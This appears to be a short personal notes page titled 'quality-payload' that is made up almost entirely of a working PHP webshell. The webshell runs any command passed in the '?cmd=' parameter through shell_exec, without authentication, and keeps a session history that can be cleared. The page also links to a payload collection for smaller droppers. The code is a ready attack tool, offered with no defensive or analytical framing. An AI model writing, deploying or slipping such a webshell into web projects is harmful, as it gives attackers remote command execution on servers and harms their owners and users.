# quality-payload

**Author:** Julien Bongars\
**Date:** 2025-09-21 09:48:44
**Path:**

---

PHP webshell: `?cmd=` runs via `shell_exec`, history in the session, `?clear=1` wipes it.

## Payload

```php
<!DOCTYPE html>
<html>
<head>
    <title>Shell</title>
</head>
<body>

<?php
session_start();

if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = array();
}

if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    $_SESSION['history'][] = array('cmd' => $cmd, 'output' => $output);
}

if (isset($_GET['clear'])) {
    $_SESSION['history'] = array();
}
?>

<div style="border: 1px solid #ccc; height: 400px; overflow-y: scroll; padding: 10px; font-family: monospace; background: #f5f5f5;">
<?php
foreach ($_SESSION['history'] as $entry) {
    echo "<div>";
    echo "<strong>$ " . htmlspecialchars($entry['cmd']) . "</strong><br>";
    echo "<pre>" . htmlspecialchars($entry['output']) . "</pre>";
    echo "</div>";
}
?>
</div>

<form>
    <input type="text" name="cmd" placeholder="Command" style="width: 300px;">
    <input type="submit" value="Run">
    <a href="?clear=1">Clear History</a>
</form>

</body>
</html>
```

## Resources

- [PHP shell_exec](https://www.php.net/manual/en/function.shell-exec.php) — command execution
- [PayloadsAllTheThings — PHP webshells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Shells/PHP.md) — smaller droppers
